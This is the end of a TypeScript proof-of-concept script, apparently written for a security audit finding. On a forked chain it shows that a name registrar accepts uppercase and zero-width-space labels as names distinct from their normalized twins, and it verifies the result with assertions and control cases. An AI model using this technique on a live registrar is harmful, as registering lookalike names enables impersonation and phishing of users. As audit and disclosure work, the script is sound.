  console.log(`fork block ${await pub.getBlockNumber()}  chainId ${await pub.getChainId()}`)
  console.log(`REGISTRAR ${REGISTRAR}\nREGISTRY  ${REGISTRY}`)
  console.log(`ATTACKER  ${ATTACKER.address}\nVICTIM    ${VICTIM.address}\n`)

  // _safeMint reverts on a receiver with code; the fork's accounts carry EOF stubs.
  await test.setCode({ address: VICTIM.address, bytecode: '0x' })
  await test.setBalance({ address: ATTACKER.address, value: 10n ** 20n })
  await send(ATTACKER, USDC, encodeFunctionData({
    abi: ERC20_ABI, functionName: 'mint', args: [ATTACKER.address, 10_000_000_000n] }))

  const CASES: { name: string; raw: string; twin: string }[] = [
    { name: 'UPPERCASE  (finding 9 / #90206 input)', raw: 'ZQXVBN', twin: 'zqxvbn' },
    { name: 'U+200B ZWSP (finding 8 input)', raw: 'zqx​vbn', twin: 'zqxvbn' },
  ]

  for (const c of CASES) {
    const esc = JSON.stringify(c.raw)
    console.log(`\n=== ${c.name}   label=${esc} ===`)

    ok(await pub.readContract({ address: REGISTRAR, abi: REGISTRAR_ABI,
        functionName: 'isAvailable', args: [c.raw] }), `${esc} is available before`)
    const twinBefore = await pub.readContract({ address: REGISTRAR, abi: REGISTRAR_ABI,
      functionName: 'isAvailable', args: [c.twin] })

    const { rcpt, evt, price } = await register(c.raw, VICTIM.address)

    ok(rcpt.status === 'success', `register() MINED, status=success (tx ${rcpt.transactionHash})`)
    ok(!!evt, 'NameRegistered emitted')
    if (!evt) continue

    // Byte-for-byte: the chain kept our exact UTF-8, it did not normalise it.
    const sentHex = toHex(new TextEncoder().encode(c.raw))
    const gotHex = toHex(new TextEncoder().encode(evt.label))
    ok(gotHex === sentHex,
      `event label is BYTE-IDENTICAL to what we sent (${gotHex} === ${sentHex})`)

    ok(evt.owner.toLowerCase() === VICTIM.address.toLowerCase(),
      `NameRegistered.owner === VICTIM (attacker signed, victim owns)`)

    const st = await pub.readContract({ address: REGISTRY, abi: REGISTRY_ABI,
      functionName: 'getState', args: [evt.tokenId] })
    ok(st.latestOwner.toLowerCase() === VICTIM.address.toLowerCase(),
      `registry getState().latestOwner === VICTIM (${st.latestOwner})`)

    // The decisive one: the normalized twin is a DIFFERENT name and is untouched.
    const twinAfter = await pub.readContract({ address: REGISTRAR, abi: REGISTRAR_ABI,
      functionName: 'isAvailable', args: [c.twin] })
    ok(twinBefore === twinAfter,
      `twin ${JSON.stringify(c.twin)} availability UNCHANGED (${twinBefore} -> ${twinAfter}) - distinct names`)
    ok(keccak256(toHex(c.raw)) !== keccak256(toHex(c.twin)),
      'labelhash(raw) !== labelhash(twin)')
    ok(!(await pub.readContract({ address: REGISTRAR, abi: REGISTRAR_ABI,
        functionName: 'isAvailable', args: [c.raw] })), `${esc} is NOT available after`)
    console.log(`  (paid ${price} USDC units)`)
  }

  // ── CONTROLS ────────────────────────────────────────────────────────────
  // Both run the FULL commit -> wait -> register path, so they reach the same
  // depth as the positives. The ONLY difference between them is the label.
  // (A first attempt skipped the commitment and reverted CommitmentTooOld
  // 0x0cb9df3f - an earlier guard - which would have proven nothing.)
  const controlRegister = async (label: string) => {
    const secret = keccak256(toHex(`ctl:${label}`))
    const args = [label, VICTIM.address, secret, zeroAddress, zeroAddress, DURATION] as const
    const commitment = await pub.readContract({
      address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'makeCommitment',
      args: [...args, zeroHash],
    })
    await send(ATTACKER, REGISTRAR, encodeFunctionData({
      abi: REGISTRAR_ABI, functionName: 'commit', args: [commitment] }))
    const minAge = await pub.readContract({
      address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'MIN_COMMITMENT_AGE' })
    await test.increaseTime({ seconds: Number(minAge) + 1 })
    await test.mine({ blocks: 1 })
    // Fixed generous allowance: getRegisterPrice() itself reverts for an
    // invalid label, so the control cannot ask for a price first.
    await send(ATTACKER, USDC, encodeFunctionData({
      abi: ERC20_ABI, functionName: 'approve', args: [REGISTRAR, 10_000_000_000n] }))
    try {
      await pub.simulateContract({
        address: REGISTRAR, abi: REGISTRAR_ABI, functionName: 'register',
        args: [...args, USDC, zeroHash], account: ATTACKER,
      })
      return { reverted: false, selector: '' }
    } catch (e) {
      const m = JSON.stringify(e, (_k, v) => (typeof v === 'bigint' ? v.toString() : v))
        .match(/0x(?:dbfa2886|477707e8|0cb9df3f|6be614e3|[0-9a-f]{8})/i)
      return { reverted: true, selector: m ? m[0] : '' }
    }
  }

  console.log('\n=== CONTROL A (positive): a VALID label must pass the same path ===')
  const good = await controlRegister('zqxctl')
  ok(!good.reverted,
    `register("zqxctl") does NOT revert on the control path${good.reverted ? ` (got ${good.selector})` : ''}`)

  console.log('\n=== CONTROL B (negative): 1-codepoint label "a" must be rejected ===')
  const bad = await controlRegister('a')
  ok(bad.reverted, 'register("a") REVERTS')
  ok(bad.selector.toLowerCase().startsWith('0xdbfa2886'),
    `and the revert is NotValid(string) 0xdbfa2886 - the VALIDITY check, not an earlier guard (got ${bad.selector || 'n/a'})`)

  console.log(`\n${failures === 0 ? 'GATE 1 GREEN - all assertions passed' : `GATE 1 RED - ${failures} failure(s)`}`)
  process.exit(failures === 0 ? 0 : 1)
}

main().catch((e) => { console.error(e); process.exit(1) })
```
